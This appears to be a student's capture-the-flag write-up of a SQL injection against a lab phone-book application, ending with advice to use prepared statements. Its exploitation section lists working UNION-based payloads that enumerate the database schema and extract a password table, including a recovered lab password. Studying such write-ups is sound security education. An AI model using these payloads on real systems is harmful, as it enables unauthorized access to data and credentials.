hackers
==============

Overview
--------
I was presented with a web page which was rendered by some application running on a server. The application is capable of filtering and presenting the name, surename, nickname and telephone number of people it had saved in some database.

Vulnerability
-------------
The application uses a the users partially sanitised input as a parameter for a condition in an sql select statement which was not built by using a prepared statement, but by plain string concatenation. This way I was able to insert strings which wuold be interpreted not only as a parameter but as part of the query to execute as well.

Exploitation
------------
At first I just tried to insert a few non alphabetical characters and fragments of sql queries to see where it takes me and how the application is behaving. I soon found that the application just throws back sql errors blindly and that I couldn't use `#` or `--` to comment out the rest of the applications statement because those were removed and a special error was thrown.  
Next I tried to end the statement and append a new one of my own which just lead to syntax errors. Instead of going down that road I remembered the usage of the `UNION` operator from todays class and went that way which went pretty smooth.  
After some trial and error I realised that the table and column names werer not in the form I expected so I researched a little about the schema of mysqls table metadata. The rest was just a question of getting those names and finding the right persons with the password needed.  
Here is a summary of the queries I executed successfully:  

    # The query string must look something like this
    SELECT name, surname, nick, telephone FROM users WHERE nick = ' + user_input + ' LIMIT 1

    ' OR '1'='1
    # time to inject

    ' UNION SELECT table_name, table_name, table_name, table_name FROM information_schema.tables WHERE table_schema = 'hackers
    # hackerztelbookz

    ' UNION SELECT column_name, column_name, column_name, column_name FROM information_schema.columns WHERE table_name = 'hackerztelbookz
    # id

    ' UNION SELECT column_name, column_name, column_name, column_name FROM information_schema.columns WHERE column_name NOT IN ('id') AND table_name = 'hackerztelbookz
    # name

    ' UNION SELECT column_name, column_name, column_name, column_name FROM information_schema.columns WHERE column_name NOT IN ('id', 'name') AND table_name = 'hackerztelbookz
    # surname

    ' UNION SELECT column_name, column_name, column_name, column_name FROM information_schema.columns WHERE column_name NOT IN ('id', 'name', 'surname') AND table_name = 'hackerztelbookz
    # nick

    ' UNION SELECT column_name, column_name, column_name, column_name FROM information_schema.columns WHERE column_name NOT IN ('id', 'name', 'surname', 'nick') AND table_name = 'hackerztelbookz
    # telephone

    ' UNION SELECT column_name, column_name, column_name, column_name FROM information_schema.columns WHERE column_name NOT IN ('id', 'name', 'surname', 'nick', 'telephone') AND table_name = 'hackerztelbookz
    # 0 rows

    ' UNION SELECT table_name, table_name, table_name, table_name FROM information_schema.tables WHERE table_name NOT IN ('hackerztelbookz') AND table_schema = 'hackers
    # hackrzpasswdz

    ' UNION SELECT table_name, table_name, table_name, table_name FROM information_schema.tables WHERE table_name NOT IN ('hackerztelbookz', 'hackrzpasswdz') AND table_schema = 'hackers
    # 0 rows

    ' UNION SELECT column_name, column_name, column_name, column_name FROM information_schema.columns WHERE table_name = 'hackrzpasswdz
    # id

    ' UNION SELECT column_name, column_name, column_name, column_name FROM information_schema.columns WHERE column_name NOT IN ('id') AND table_name = 'hackrzpasswdz
    # hacker_id

    ' UNION SELECT column_name, column_name, column_name, column_name FROM information_schema.columns WHERE column_name NOT IN ('id', 'hacker_id') AND table_name = 'hackrzpasswdz
    # secretpaswd

    ' UNION SELECT nick, hacker_id, secretpaswd, secretpaswd FROM hackrzpasswdz, hackerztelbookz WHERE nick = 'Acid Burn
    # Acid Burn	6	nopenopenotthisone	nopenopenotthisone
    ' UNION SELECT nick, hacker_id, secretpaswd, secretpaswd FROM hackrzpasswdz, hackerztelbookz WHERE nick = 'Phantom Phreak
    # Phantom Phreak	6	nopenopenotthisone	nopenopenotthisone
    ' UNION SELECT nick, hacker_id, secretpaswd, secretpaswd FROM hackrzpasswdz, hackerztelbookz WHERE nick = 'Lord Nikon
    # Lord Nikon	6	nopenopenotthisone	nopenopenotthisone
    ' UNION SELECT nick, hacker_id, secretpaswd, secretpaswd FROM hackrzpasswdz, hackerztelbookz WHERE nick = 'The Plague
    # The Plague	6	nopenopenotthisone	nopenopenotthisone
    ' UNION SELECT nick, hacker_id, secretpaswd, secretpaswd FROM hackrzpasswdz, hackerztelbookz WHERE nick = 'Zero Cool
    # Zero Cool	6	nopenopenotthisone	nopenopenotthisone
    ' UNION SELECT nick, hacker_id, secretpaswd, secretpaswd FROM hackrzpasswdz, hackerztelbookz WHERE nick = 'Master of Disaster
    # Master of Disaster	6	nopenopenotthisone	nopenopenotthisone
    ' UNION SELECT nick, hacker_id, secretpaswd, secretpaswd FROM hackrzpasswdz, hackerztelbookz WHERE nick = 'Cereal Killer
    # Cereal Killer 6   nopenopenotthisone  nopenopenotthisone

    ' UNION SELECT nick, hacker_id, secretpaswd, secretpaswd FROM hackrzpasswdz, hackerztelbookz WHERE hacker_id = 0 AND '1'='1
    # returned 0 rows
    ' UNION SELECT nick, hacker_id, secretpaswd, secretpaswd FROM hackrzpasswdz, hackerztelbookz WHERE hacker_id = 1 AND '1'='1
    # returned 0 rows
    ' UNION SELECT nick, hacker_id, secretpaswd, secretpaswd FROM hackrzpasswdz, hackerztelbookz WHERE hacker_id = 2 AND '1'='1
    # returned 0 rows
    ' UNION SELECT nick, hacker_id, secretpaswd, secretpaswd FROM hackrzpasswdz, hackerztelbookz WHERE hacker_id = 3 AND '1'='1
    # Acid Burn 3   bN10R4Ce3jbG7WSzulBJ    bN10R4Ce3jbG7WSzulBJ

Solution
--------
Using prepared statements instead of plain string concatenation would be advisable. Another improvement would be to match the user input against a regular expression which defines the allowed structure of the query parameter instead of black listing selectively.
